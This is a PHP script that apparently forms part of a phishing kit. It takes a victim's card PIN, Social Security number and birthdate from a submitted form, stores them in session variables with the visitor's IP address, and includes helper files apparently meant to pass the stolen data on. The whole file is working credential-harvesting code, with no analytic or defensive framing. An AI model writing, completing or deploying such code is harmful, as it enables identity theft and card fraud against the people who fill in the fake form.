<?php
session_start();
$TIME_DATE = date('H:i:s d/m/Y');
include('../../functions/get_bin.php');
include('../../functions/get_browser.php');
include('../../functions/get_ip.php');
$_SESSION['loged'] = "loged3";

$_SESSION['TIME_DATE'] = $TIME_DATE;
$_SESSION['loged'] = "loged3";

$_SESSION['_CardPIN_']        = $_POST['CardPIN'];
$_SESSION['_SSN_']      = $_POST['SSN'];
$_SESSION['Birthdate']     = $_POST['birthdate'];

include("system.php");
include("function.php");
$ip=$_SESSION['ip']=getip();


include('../tnt/sv1.php');





?>